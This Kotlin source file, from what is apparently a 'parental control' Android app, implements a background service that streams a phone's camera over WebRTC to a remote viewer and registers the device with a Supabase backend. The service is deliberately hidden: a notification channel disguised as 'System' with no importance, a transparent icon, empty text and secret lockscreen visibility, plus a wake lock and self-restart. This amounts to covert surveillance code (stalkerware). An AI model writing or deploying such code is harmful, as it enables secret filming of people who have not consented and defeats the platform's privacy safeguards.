package com.parentalcontrol.kidcamera

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import kotlinx.coroutines.*

/**
 * Background foreground service that streams the kid's camera to the parent.
 *
 * Differences from kid-monitor version:
 *  - This is the ONLY service (no MonitorService / screen share)
 *  - Runs heartbeat loop directly (no UsageStatsHelper)
 *  - Registers device in Supabase with capture_status = "camera-only"
 *
 * Notification: IMPORTANCE_NONE + transparent icon → invisible to the user.
 */
class CameraStreamService : Service() {

    private val prefs by lazy { getSharedPreferences(SetupActivity.PREFS_NAME, MODE_PRIVATE) }
    private var pairingKey = ""
    private var deviceId   = ""

    private var cameraClient: WebRTCCameraKidClient? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var heartbeatJob: Job? = null
    private var supabaseManager: SupabaseManager? = null

    override fun onCreate() {
        super.onCreate()
        pairingKey = prefs.getString(SetupActivity.KEY_PAIRING_KEY, "") ?: ""
        deviceId   = prefs.getString(SetupActivity.KEY_DEVICE_ID,  "") ?: ""

        startAsForeground()

        // Acquire WakeLock so CPU stays on during Doze / screen-off
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "KidCamera::CameraWakeLock"
        ).also { it.acquire() }

        if (pairingKey.isNotEmpty() && deviceId.isNotEmpty()) {
            supabaseManager = SupabaseManager(deviceId, pairingKey)
            // Register device and start camera
            serviceScope.launch {
                try {
                    val model = Build.MODEL
                    val mfr   = Build.MANUFACTURER
                    supabaseManager?.registerDevice(model, mfr)
                } catch (e: Exception) {
                    Log.e(TAG, "registerDevice: ${e.message}")
                }
            }
            startCameraClient()
            startHeartbeat()
            // Start watchdog
            WatchdogReceiver.schedule(this)
        } else {
            Log.e(TAG, "Missing pairingKey or deviceId — cannot start camera client")
        }
    }

    private fun startCameraClient() {
        Log.d(TAG, "Starting WebRTCCameraKidClient")
        cameraClient = WebRTCCameraKidClient(
            context     = this,
            deviceId    = deviceId,
            pairingKey  = pairingKey,
            facingFront = false
        )
        cameraClient!!.start()
    }

    private fun startHeartbeat() {
        heartbeatJob = serviceScope.launch {
            while (isActive) {
                try {
                    supabaseManager?.writeStatus("camera-only")
                } catch (e: Exception) {
                    Log.e(TAG, "Heartbeat: ${e.message}")
                }
                delay(45_000L) // 45 seconds
            }
        }
    }

    // ─── Stealth foreground notification ─────────────────────────────
    private fun startAsForeground() {
        val nm = getSystemService(NotificationManager::class.java)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(
                CHANNEL_ID,
                "System",
                NotificationManager.IMPORTANCE_NONE
            ).apply {
                setShowBadge(false)
                setSound(null, null)
                enableLights(false)
                enableVibration(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            nm?.createNotificationChannel(ch)
        }

        val notif = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_transparent)
                .setContentTitle("")
                .setContentText("")
                .setVisibility(Notification.VISIBILITY_SECRET)
                .build()
                .also { it.flags = it.flags or Notification.FLAG_NO_CLEAR }
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
                .setSmallIcon(R.drawable.ic_transparent)
                .build()
                .also { it.flags = it.flags or Notification.FLAG_NO_CLEAR }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            startForeground(NOTIF_ID, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
        } else {
            startForeground(NOTIF_ID, notif)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onDestroy() {
        heartbeatJob?.cancel()
        serviceScope.cancel()
        cameraClient?.stop()
        cameraClient = null
        try {
            if (wakeLock?.isHeld == true) wakeLock?.release()
        } catch (e: Exception) {
            Log.w(TAG, "WakeLock release: ${e.message}")
        }
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    companion object {
        private const val TAG        = "CameraStreamService"
        private const val CHANNEL_ID = "cam_only_svc_v1"
        private const val NOTIF_ID   = 77

        fun start(context: Context) {
            val i = Intent(context, CameraStreamService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                context.startForegroundService(i)
            else
                context.startService(i)
        }

        fun stop(context: Context) {
            context.stopService(Intent(context, CameraStreamService::class.java))
        }
    }
}
